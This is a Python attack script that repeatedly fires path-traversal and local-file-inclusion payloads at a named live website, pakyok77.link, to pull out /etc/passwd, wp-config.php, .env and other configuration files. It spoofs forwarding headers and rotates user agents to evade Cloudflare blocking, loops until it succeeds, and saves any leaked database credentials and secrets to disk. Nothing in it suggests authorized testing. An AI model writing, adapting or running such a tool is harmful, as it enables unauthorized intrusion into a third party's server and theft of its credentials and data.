#!/usr/bin/env python3
import requests
import random
import time
import os
import threading
from datetime import datetime

class FastBypassTester:
    def __init__(self):
        self.target = "https://pakyok77.link"
        self.attempt = 0
        self.success_count = 0
        self.lock = threading.Lock()
        
    def generate_headers(self):
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15',
            'Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36',
            'curl/7.68.0'
        ]
        
        return {
            'User-Agent': random.choice(user_agents),
            'X-Forwarded-For': f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}',
            'X-Real-IP': f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}',
            'X-Originating-IP': f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}'
        }
    
    def test_single_payload(self, target_file, endpoint, param, payload):
        with self.lock:
            self.attempt += 1
            current_attempt = self.attempt
        
        headers = self.generate_headers()
        url = f"{self.target}/{endpoint}"
        
        try:
            response = requests.get(
                url, 
                params={param: payload}, 
                headers=headers, 
                timeout=5
            )
            
            if self.check_success(response, target_file):
                with self.lock:
                    print(f"\n🎉 BYPASS SUCCESS! Attempt #{current_attempt}")
                    print(f"📁 File: {target_file}")
                    print(f"🌐 URL: {url}?{param}={payload}")
                    print(f"📊 Status: {response.status_code}")
                    print(f"📏 Size: {len(response.text)} bytes")
                    
                    self.save_file(target_file, response.text, url, param, payload, current_attempt)
                return True
                
        except Exception:
            pass
        
        return False
    
    def check_success(self, response, target_file):
        if response.status_code != 200:
            return False
        
        content = response.text.lower()
        
        if any(x in content for x in ['cloudflare', 'blocked', 'forbidden', 'ray id']):
            return False
        
        indicators = {
            'etc/passwd': ['root:', 'bin:', 'daemon:'],
            'etc/shadow': ['root:', '$', '::'],
            'wp-config.php': ['db_name', 'db_user', 'wp_'],
            'config.php': ['<?php', 'database', 'password'],
            '.env': ['app_key', 'db_', '='],
            '.htaccess': ['rewriteengine', 'options']
        }
        
        for file_pattern, file_indicators in indicators.items():
            if file_pattern in target_file and any(indicator in content for indicator in file_indicators):
                return True
        
        if len(response.text) > 300 and not any(x in content for x in ['<html>', '<body>', '<!doctype']):
            return True
        
        return False
    
    def save_file(self, target_file, content, url, param, payload, attempt_num):
        os.makedirs("fast_bypass_success", exist_ok=True)
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"fast_bypass_success/{target_file.replace('/', '_')}_{timestamp}.txt"
        
        with open(filename, 'w', encoding='utf-8') as f:
            f.write(f"# FAST BYPASS SUCCESS!\n")
            f.write(f"# File: {target_file}\n")
            f.write(f"# URL: {url}?{param}={payload}\n")
            f.write(f"# Attempt: {attempt_num}\n")
            f.write(f"# Timestamp: {datetime.now()}\n")
            f.write("=" * 60 + "\n\n")
            f.write(content)
        
        self.success_count += 1
        print(f"💾 Saved: {filename}")
        print(f"📄 Content preview:")
        print("-" * 40)
        print(content[:500])
        if len(content) > 500:
            print("... [TRUNCATED]")
        print("-" * 40)
    
    def run_fast_test(self):
        print("🚀 FAST INFINITE BYPASS TESTER")
        print("=" * 50)
        print("🎯 Target:", self.target)
        print("⚡ Optimized for speed!")
        print("=" * 50)
        
        files = ['etc/passwd', 'wp-config.php', '.env', '.htaccess', 'config.php']
        params = ['page', 'file', 'include', 'path', 'view']
        endpoints = ['index.php', 'main.php', 'view.php', 'admin.php']
        
        round_count = 0
        
        while self.success_count == 0:
            round_count += 1
            print(f"\n🔄 ROUND #{round_count}")
            
            for target_file in files:
                print(f"\n🔍 Testing: {target_file}")
                
                # Generate focused payloads
                payloads = []
                for depth in range(1, 8):
                    payloads.append('../' * depth + target_file)
                    payloads.append('%2e%2e%2f' * depth + target_file)
                
                for endpoint in endpoints:
                    for param in params:
                        for payload in payloads:
                            if self.test_single_payload(target_file, endpoint, param, payload):
                                print(f"✅ SUCCESS: {target_file}")
                                break
                        if self.success_count > 0:
                            break
                    if self.success_count > 0:
                        break
                
                if self.attempt % 50 == 0:
                    print(f"⚡ Attempt #{self.attempt}")
                
                time.sleep(0.1)
            
            if self.success_count > 0:
                print(f"\n🎉 BREAKTHROUGH! Downloaded {self.success_count} files!")
                break
            
            print(f"\n🔄 Round {round_count} done. Attempts: {self.attempt}")
            time.sleep(1)

def main():
    tester = FastBypassTester()
    tester.run_fast_test()

if __name__ == "__main__":
    main()